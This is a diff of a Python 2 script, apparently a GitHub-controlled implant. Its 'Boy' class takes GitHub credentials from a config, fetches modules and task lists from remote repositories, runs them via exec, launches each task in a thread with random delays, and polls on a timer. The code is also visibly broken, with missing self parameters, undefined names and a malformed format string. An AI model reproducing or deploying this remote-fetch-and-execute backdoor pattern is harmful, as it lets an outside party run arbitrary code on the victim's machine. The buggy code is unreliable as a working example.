@@ -18,16 +18,7 @@ logger = logging.getLogger(__name__)
 # logger.setLevel(logging.WARN)
 logger.setLevel(logging.DEBUG)
 
-from toy.httpimp import add_remote_repo, remove_remote_repo
-add_remote_repo(
-    ['toy'],
-    'https://raw.githubusercontent.com/how2how/toy/master')
-add_remote_repo(
-    ['nacl'],
-    'https://raw.githubusercontent.com/how2how/toy/master/toy/external')
-add_remote_repo(
-    ['covertutils'],
-    'https://raw.githubusercontent.com/how2how/toy/master/toy/external')
+from httpimp import add_remote_repo, remove_remote_repo
 from toy.modules import gh
 print sys.path
 for i in sys.modules:
@@ -36,23 +27,21 @@ for i in sys.modules:
 
 class Boy(object):
     _id = 'abc'
-    config_url = ('https://raw.githubusercontent.com/how2how/toy/master/toy/'
-                  'config/')
 
     def __init__(self, config):
-        self.guser = config.pop('gu', '')
-        # gpass = config.pop('gp', '')
-        self.gtoken = config.pop('to', '')
-        self.grepo = config.pop('gr', '')
-        self.base_modules = config.pop('bm', {})
-        self.task_url = config.pop('tu', self.config_url)
-        self.run_modules = config.pop('rm', [])
-        self.cf = int(config.pop('cf', 60))
         self.task_queue = Queue.Queue()
         self.result_path = 'data/%s/' % self._id
-        # self.gh, self.repo, self.branch = Boy.connect(guser, gpass, grepo)
-        # for g in (guser, gpass, grepo):
-        #     del g
+        self.parse_conf(config)
+
+    def parse_conf(self, config):
+        self.guser = config.pop('gu', '')
+        self.gtoken = config.pop('gt', '')
+        self.grepo = config.pop('gr', '')
+        self.base_modules = config.pop('bm', {})
+        self.conf_url = config.pop('cu', None)
+        self.task_url = config.pop('tu', None)
+        self.run_modules = config.pop('rm', [])
+        self.cf = int(config.pop('cf', 60))
 
     # @staticmethod
     # def connect(u, p, r, b='master'):
@@ -76,8 +65,13 @@ class Boy(object):
     #     return data
 
     def load(module, url):
-        add_remote_repo([module], url)
-        exec "import %s" % module
+        try:
+            logging.debug('Try to import module')
+            add_remote_repo([module], url)
+            exec "import %s" % module
+        except Exception:
+            logging.error('Exception with import %s' % pkg)
+            pass
 
     def unload(module, url):
         remove_remote_repo(url)
@@ -85,14 +79,13 @@ class Boy(object):
             del module
 
     def install(self):
-        for pkg, url in self.base_modules.items():
-            try:
-                add_remote_repo([pkg], url)
-                print 'Try to import %s' % pkg
-                exec "import %s" % pkg
-            except Exception:
-                print 'exception with %s' % pkg
-                pass
+        for url, pkgs in self.base_modules.items():
+            if not isinstance(pkgs, (list, tuple)):
+                pkgs = [pkgs]
+            self.load(pkgs, url)
+        for pkg in self.run_modules:
+            self.load_module(pkg)
+
         # for m in self.run_modules:
         #     try:
         #         exec "from toy.modules import %s" % m
@@ -115,13 +108,29 @@ class Boy(object):
             config = {}
         return config
 
+    def check(self, url=None):
+        url = url or self.conf_url
+        conf = self.get_config(url)
+        self.parse_conf(conf)
+        for task in self.run_modules:
+            self.load_module(task['module'])
+        tasks = self.load_task(self.task_url) if self.task_url else []
+        self.run_modules += tasks
+
+    def load_module(mod, pkg='toy.modules'):
+        try:
+            exec "from %s import " % (pkg, mod)
+        except Exception:
+            logging.error("Import %s error" % '.'.join((pkg, mod)))
+
     @staticmethod
     def load_task(task_url):
         tasks = gh.get_raw(task_url)
         if tasks:
             tasks = json.loads(tasks)
-            for task in tasks:
-                exec "from toy.modules import %s" % task['module']
+            self.load(tasks['name'], tasks['url'])
+            for task in tasks['task']:
+                self.load_module(task['module'], tasks['name'] + '.modules')
         else:
             tasks = []
         return tasks
@@ -149,9 +158,12 @@ class Boy(object):
         self.install()
         while True:
             if self.task_queue.empty():
-                tasks = self.get_task(self.task_url + self._id + '.json')
+                if self.task_url:
+                    tasks = self.load_task(self.task_url)
+                # tasks = self.get_task(self.task_url + self._id + '.json')
+                tasks = self.load_task()
                 for task in tasks:
-                    print "run task %s" % task['module']
+                    logging.debug("run task %s" % task['module'])
                     mod = 'toy.modules.%s' % task['module']
                     try:
                         t = threading.Thread(
@@ -159,7 +171,7 @@ class Boy(object):
                         t.start()
                         time.sleep(random.randint(1, 10))
                     except Exception:
-                        print 'run exception'
+                        logging.error('run exception')
                         pass
             time.sleep(self.cf)
             # time.sleep(random.randint(1000, 10000))
